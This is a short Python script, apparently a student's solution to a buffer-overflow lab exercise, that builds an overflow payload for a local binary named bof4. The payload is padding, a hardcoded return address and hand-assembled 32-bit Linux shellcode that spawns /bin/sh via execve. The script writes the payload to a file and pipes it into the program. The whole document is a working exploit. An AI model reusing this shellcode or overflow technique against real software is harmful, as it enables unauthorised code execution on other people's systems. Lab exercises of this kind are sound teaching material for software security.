#!/usr/bin/python3
import sys
import subprocess

path = '/home/kribas/Software-Security-Lab/bof-exercise-2/bof4'
infile = f'{path}/input2.txt'
vuln = f'{path}/bof4'


XOR_EAX_EAX= b'\x31\xc0' #2b
XOR_EDX_EDX = b"\x31\xd2" #2b
PUSH_EAX = b"\x50" #1b
PUSH_ARG_1 = b"\x68\x2f\x2f\x73\x68" #5b
PUSH_ARG_2 = b"\x68\x2f\x62\x69\x6e" #5b
MOV_EBX_ESP = b"\x89\xe3" #2b
MOV_AL_0B = b"\xb0\x0b" #2b
INT_80H = b"\xcd\x80" #2b

SHELLCODE = XOR_EAX_EAX+\
        XOR_EDX_EDX+\
        PUSH_EAX+\
        PUSH_ARG_1+\
        PUSH_ARG_2+\
        MOV_EBX_ESP+\
        MOV_AL_0B+\
        INT_80H


buff_len = 0x18
win_addr = b'\x80\xd3\xff\xff'
buffer = b'A'*buff_len +b'BBBB' + win_addr + SHELLCODE

with open(infile,'wb') as f:
	f.write(buffer)
	f.close()

with open(infile,'rb') as f:
	prog = subprocess.run(['/home/kribas/Software-Security-Lab/bof-exercise-2/bof4/bof4'],stdout=subprocess.PIPE,stdin=f)
	print(prog.stdout)
	sys.stdout.buffer.write(prog.stdout)
	f.close()
